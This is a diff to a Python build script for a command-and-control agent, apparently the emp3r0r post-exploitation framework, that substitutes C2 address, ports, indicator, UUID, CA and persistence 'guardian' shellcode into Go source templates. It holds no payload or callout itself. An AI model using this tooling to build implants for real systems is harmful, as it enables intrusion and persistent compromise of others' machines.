@@ -125,13 +125,17 @@ class GoBuild:
         restore tags in the source
         '''
 
+        # agent root path
         sed("./internal/agent/def.go",
             self.AgentRoot, "[agent_root]")
+        # CA
         sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
-        sed("./internal/agent/def.go", CACHED_CONF['guadian_shellcode'],
+        # guadian_shellcode
+        sed("./internal/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guadian_shellcode']}`",
             "[persistence_shellcode]")
-        sed("./internal/agent/def.go", CACHED_CONF['guardian_agent_path'],
+        sed("./internal/agent/def.go", f"GuardianAgentPath = `{CACHED_CONF['guardian_agent_path']}`",
             "[persistence_agent_path]")
+        # cc indicator
         sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
         sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
@@ -149,21 +153,28 @@ class GoBuild:
         modify some tags in the source
         '''
 
+        # guadian shellcode
         sed("./internal/agent/def.go",
             "[persistence_shellcode]", CACHED_CONF['guadian_shellcode'])
         sed("./internal/agent/def.go",
             "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+        # CA
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
+        # CC IP
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        # agent root path
+        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
+        # indicator
+        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        # agent UUID
+        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
+        # ports
         sed("./internal/agent/def.go",
             "[cc_port]", CACHED_CONF['cc_port'])
         sed("./internal/agent/def.go",
             "[proxy_port]", CACHED_CONF['proxy_port'])
         sed("./internal/agent/def.go",
             "[broadcast_port]", CACHED_CONF['broadcast_port'])
-        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
-        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
-        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
 
 
 def clean():
@@ -375,6 +386,7 @@ def gen_guardian_shellcode(path):
         os.chdir(pwd)
 
         shellcode = out.decode('utf-8')
+
         if "Failed" in shellcode:
             log_error("Failed to generate shellcode: "+out)
 
